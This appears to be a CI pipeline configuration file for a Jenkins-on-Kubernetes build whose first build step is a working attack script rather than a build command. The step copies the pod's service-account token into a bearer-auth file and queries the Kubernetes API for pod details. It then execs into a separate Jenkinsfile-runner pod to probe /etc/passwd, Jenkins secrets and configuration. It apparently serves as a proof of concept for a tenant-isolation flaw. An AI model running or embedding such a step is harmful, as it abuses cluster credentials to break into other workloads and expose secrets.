general:
  buildTool: 'mta'
  jenkinsKubernetes:
    additionalPodProperties:
      automountServiceAccountToken: true
service:
  stages:
    Build:
      runFirst:
        command: |
          set +x
          T=/var/run/secrets/kubernetes.io/serviceaccount
          NS=$(cat $T/namespace); K=https://kubernetes.default.svc
          { printf 'header = "Authorization: Bearer '; cat $T/token; printf '"\n'; } > /tmp/kc
          chmod 600 /tmp/kc
          SELF=$(hostname)
          cat > /tmp/probe.sh <<'EOS'
          echo "  etc_hostname   = $(cat /etc/hostname 2>/dev/null)"
          echo "  hostname_i     = $(hostname -i 2>/dev/null)"
          echo "  ns_mnt         = $(readlink /proc/self/ns/mnt)"
          echo "  ns_uts         = $(readlink /proc/self/ns/uts)"
          echo "  ns_pid         = $(readlink /proc/self/ns/pid)"
          echo "  pid1_cmdline   = $(tr '\0' ' ' < /proc/1/cmdline)"
          echo "  passwd_lines   = $(wc -l < /etc/passwd)"
          echo "  passwd_md5     = $(md5sum < /etc/passwd | cut -d' ' -f1)"
          echo "  passwd_uid1000 = $(awk -F: '$3==1000' /etc/passwd)"
          echo "  os_release     = $(. /etc/os-release 2>/dev/null; echo $ID-$VERSION_ID)"
          echo "  root_dirs      = $(ls / 2>/dev/null | tr '\n' ' ')"
          echo "  jenkins_home   = $(ls -d /jenkins_home 2>/dev/null || echo ABSENT)"
          echo "  jh_entries     = $(ls /jenkins_home 2>/dev/null | tr '\n' ' ')"
          echo "  jh_config_xml  = $(wc -c < /jenkins_home/config.xml 2>/dev/null || echo ABSENT) bytes"
          echo "  jh_secrets     = $(ls /jenkins_home/secrets 2>/dev/null | tr '\n' ' ')"
          echo "  agent_workdir  = $(ls -d /home/jenkins/agent 2>/dev/null || echo ABSENT)"
          echo "  resolv_search  = $(grep -h '^search' /etc/resolv.conf 2>/dev/null)"
          echo "  sa_token_bytes = $(wc -c < /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo ABSENT)"
          EOS
          sed -i 's/^          //' /tmp/probe.sh
          echo "KPDIFF7788-NS=$NS"
          echo "########## SIDE 1: THE BUILD CONTAINER (where my pipeline code legitimately runs) ##########"
          sh /tmp/probe.sh
          echo "########## KUBERNETES API RECORD FOR BOTH PODS (independent of any exec) ##########"
          curl -s --config /tmp/kc -o /tmp/pr --cacert $T/ca.crt $K/api/v1/namespaces/$NS/pods/steward-jenkinsfile-runner-pod
          curl -s --config /tmp/kc -o /tmp/ps --cacert $T/ca.crt $K/api/v1/namespaces/$NS/pods/$SELF
          node -e '
            const fs=require("fs");
            for (const [tag,f] of [["RUNNER","/tmp/pr"],["BUILDCTR","/tmp/ps"]]) {
              const p=JSON.parse(fs.readFileSync(f,"utf8"));
              console.log(`  ${tag}.metadata.name = ${p.metadata.name}`);
              console.log(`  ${tag}.metadata.uid  = ${p.metadata.uid}`);
              console.log(`  ${tag}.status.podIP  = ${(p.status||{}).podIP}`);
              console.log(`  ${tag}.spec.nodeName = ${(p.spec||{}).nodeName}`);
              console.log(`  ${tag}.spec.serviceAccountName = ${(p.spec||{}).serviceAccountName}`);
              for (const cs of ((p.status||{}).containerStatuses||[]))
                console.log(`  ${tag}.container ${cs.name} image=${(cs.image||"").slice(0,70)} id=${cs.containerID}`);
            }'
          Q=$(node -e 'console.log(require("fs").readFileSync("/tmp/probe.sh","utf8"))' | node -e 'let d="";process.stdin.on("data",c=>d+=c).on("end",()=>process.stdout.write(encodeURIComponent(d)))')
          KEY=$(head -c 16 /dev/urandom | base64)
          echo "########## SIDE 2: THE SAME SCRIPT, EXEC'd INSIDE steward-jenkinsfile-runner-pod ##########"
          echo "KPDIFF7788-EXEC-STATUS=$(curl -s -o /tmp/ex -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --http1.1 -N --max-time 30 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/steward-jenkinsfile-runner-pod/exec?container=step-jenkinsfile-runner&stdout=true&stderr=true&command=sh&command=-c&command=$Q")"
          strings /tmp/ex | sed -n '1,40p'
          rm -f /tmp/kc /tmp/ex /tmp/pr /tmp/ps /tmp/probe.sh
          echo "KPDIFF7788-DONE"
